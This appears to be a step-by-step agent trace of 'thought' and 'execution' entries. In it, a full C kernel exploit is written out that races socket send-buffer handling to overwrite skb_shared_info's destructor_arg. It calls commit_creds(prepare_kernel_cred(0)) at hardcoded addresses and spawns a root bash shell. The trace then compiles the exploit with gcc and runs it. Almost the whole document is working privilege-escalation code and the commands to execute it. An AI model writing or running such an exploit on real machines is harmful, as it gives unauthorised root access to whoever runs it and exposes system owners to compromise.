[
    {
        "type": "thought",
        "content": "The following exploit code demonstrates how a local user can leverage the vulnerability to gain root privileges on a vulnerable system. Memory Mapping:\n\nThe mmap function maps a region of memory to a specific address where the payload resides.\nThread Creation:\n\nTwo threads are created:\nskb_thr: Continuously overwrites the destructor_arg field in skb_shared_info.\nwrite_thr: Attempts to write data to the socket.\nSocket Creation:\n\nA socket pair is created using socketpair.\nSetting Socket Options:\n\nThe setsockopt function is used to set the SO_SNDBUFFORCE option with a large buffer size.\nExploiting the Vulnerability:\n\nBy manipulating the destructor_arg field and other fields in skb_shared_info, the exploit aims to execute arbitrary code with elevated privileges.\nPayload Execution:\n\nIf successful, the payload grants root privileges and opens a shell."
    },
    {
        "type": "execution",
        "content": "#define _GNU_SOURCE\n\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/mman.h>\n\n#include <pthread.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define COMMIT_CREDS 0xffffffff81079860ul\n#define PREPARE_KERNEL_CRED 0xffffffff81079b20ul\n\ntypedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);\ntypedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);\n\n_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;\n_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;\n\nvoid get_root(void) {\n    commit_creds(prepare_kernel_cred(0));\n}\n\nstruct ubuf_info_t {\n    uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)\n    uint64_t ctx;             // void *\n    uint64_t desc;            // unsigned long\n};\n\nstruct skb_shared_info_t {\n    uint8_t  nr_frags;        // unsigned char\n    uint8_t  tx_flags;        // __u8\n    uint16_t gso_size;        // unsigned short\n    uint16_t gso_segs;        // unsigned short\n    uint16_t gso_type;        // unsigned short\n    uint64_t frag_list;       // struct sk_buff *\n    uint64_t hwtstamps;       // struct skb_shared_hwtstamps\n    uint32_t tskey;           // u32\n    uint32_t ip6_frag_id;     // __be32\n    uint32_t dataref;         // atomic_t\n    uint64_t destructor_arg;  // void *\n    uint8_t  frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];\n};\n\n// sk_sndbuf = 0xffffff00 => skb_shinfo(skb) = 0x00000000fffffed0\n#define SNDBUF 0xffffff00\n#define SHINFO 0x00000000fffffed0ul\n\nstruct ubuf_info_t ubuf_info = {(uint64_t)&get_root, 0, 0};\nstruct skb_shared_info_t *skb_shared_info = (struct skb_shared_info_t *)SHINFO;\n\n#define SKBTX_DEV_ZEROCOPY (1 << 3)\n\nvoid* skb_thr(void* arg) {\n    while (1) {\n        skb_shared_info->destructor_arg = (uint64_t)&ubuf_info;\n        skb_shared_info->tx_flags |= SKBTX_DEV_ZEROCOPY;\n    }\n}\n\nint sockets[2];\n\nvoid *write_thr(void *arg) {\n    // Write blocks until setsockopt(SO_SNDBUF).\n    write(sockets[1], \"\\x5c\", 1);\n\n    if (getuid() == 0) {\n        printf(\"[+] got r00t\\n\");\n        execl(\"/bin/bash\", \"bash\", NULL);\n        perror(\"execl()\");\n    }\n    printf(\"[-] something went wrong\\n\");\n}\n\nint main() {\n    void *addr;\n    int rv;\n    uint32_t sndbuf;\n\n    addr = mmap((void *)(SHINFO & 0xfffffffffffff000ul), 0x1000ul,\n        PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,\n        -1, 0);\n    if (addr != (void *)(SHINFO & 0xfffffffffffff000ul)) {\n        perror(\"mmap()\");\n        exit(EXIT_FAILURE);\n    }\n\n    printf(\"[.] userspace payload mmapped at %p\\n\", addr);\n\n    pthread_t skb_th;\n    rv = pthread_create(&skb_th, 0, skb_thr, NULL);\n    if (rv != 0) {\n        perror(\"pthread_create()\");\n        exit(EXIT_FAILURE);\n    }\n    usleep(10000);\n\n    printf(\"[.] overwriting thread started\\n\");\n\n    rv = socketpair(AF_LOCAL, SOCK_STREAM, 0, &sockets[0]);\n    if (rv != 0) {\n        perror(\"socketpair()\");\n        exit(EXIT_FAILURE);\n    }\n\n    printf(\"[.] sockets opened\\n\");\n\n    sndbuf = SNDBUF;\n    rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE,\n            &sndbuf, sizeof(sndbuf));\n    if (rv != 0) {\n        perror(\"setsockopt()\");\n        exit(EXIT_FAILURE);\n    }\n\n    printf(\"[.] sock->sk_sndbuf set to %x\\n\", SNDBUF * 2);\n\n    pthread_t write_th;\n    rv = pthread_create(&write_th, 0, write_thr, NULL);\n    if (rv != 0) {\n        perror(\"pthread_create()\");\n        exit(EXIT_FAILURE);\n    }\n    usleep(10000);\n\n    printf(\"[.] writing to socket\\n\");\n\n    // Wake up blocked write.\n    rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF,\n            &sndbuf, sizeof(sndbuf));\n    if (rv != 0) {\n        perror(\"setsockopt()\");\n        exit(EXIT_FAILURE);\n    }\n    usleep(10000);\n\n    close(sockets[0]);\n    close(sockets[1]);\n\n    return 0;\n}"
    },
    {
        "type": "thought",
        "content": "Save it as c file and compile it."
    },
    {
        "type": "execution",
        "content": "gcc -o exp exp.c"
    },
    {
        "type": "thought",
        "content": "Run the program to trigger it."
    },
    {
        "type": "execution",
        "content": "./exp"
    }
]